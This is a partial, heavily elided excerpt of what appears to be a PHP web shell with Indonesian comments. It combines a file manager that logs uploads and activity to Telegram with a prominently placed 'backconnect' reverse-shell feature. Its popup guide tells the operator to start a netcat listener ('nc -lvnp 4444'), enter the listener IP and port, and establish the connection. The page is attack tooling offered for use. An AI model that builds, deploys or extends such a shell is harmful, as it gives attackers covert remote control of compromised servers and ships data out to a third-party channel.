...
// Log aktivitas ke Telegram dengan detail file upload
function logActivity($action, $details = '', $uploadedFiles = []) {
    ...
    // Tambahkan informasi file yang diupload jika ada
...
// Backconnect - INI YANG PERLU DIPASTIKAN ADA
...
if (!empty($_FILES['upload']['name'][0])) {
    ...
    // Log file upload dengan detail file
    ...
    <div class="header">
        ...
        <div class="controls">
            ...
            <div class="action-buttons desktop-only">
                ...
                <!-- TOMBOL BACKCONNECT YANG TIDAK AKAN HILANG -->
...
<div class="mobile-menu">
    ...
    <!-- TOMBOL BACKCONNECT MOBILE -->
    <a href="?dir=<?=urlencode($dir)?>&show_backconnect=1" class="btn btn-backconnect pulse-orange">🔄</a>
...
<!-- BACKCONNECT POPUP - INI YANG TIDAK AKAN HILANG -->
...
<div class="popup-overlay">
    <div class="popup-content">
        ...
        <div class="popup-body">
            ...
            <div class="feature-section" style="margin-top: 20px; border-left: 4px solid var(--backconnect); padding-left: 15px;">
                <h4>📖 Quick Guide</h4>
                <div style="font-size: 13px; color: var(--text-secondary); line-height: 1.6;">
                    <p><strong>1. Start listener on YOUR machine:</strong></p>
                    <pre style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px; margin: 10px 0; font-family: monospace; font-size: 12px;">
# Linux/Mac
nc -lvnp 4444

# Windows (PowerShell)
Test-NetConnection -ComputerName YOUR_IP -Port 4444

# Windows (CMD)
telnet YOUR_IP 4444</pre>
                    
                    <p><strong>2. Enter your listener IP & port above</strong></p>
                    <p><strong>3. Click "Establish Connection"</strong></p>
                    
                    <div style="background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.2); border-radius: 8px; padding: 10px; margin-top: 15px;">
                        <small>💡 <strong>Note:</strong> Make sure firewall allows connections on the specified port.</small>
                    </div>
                </div>
            </div>
        </div>
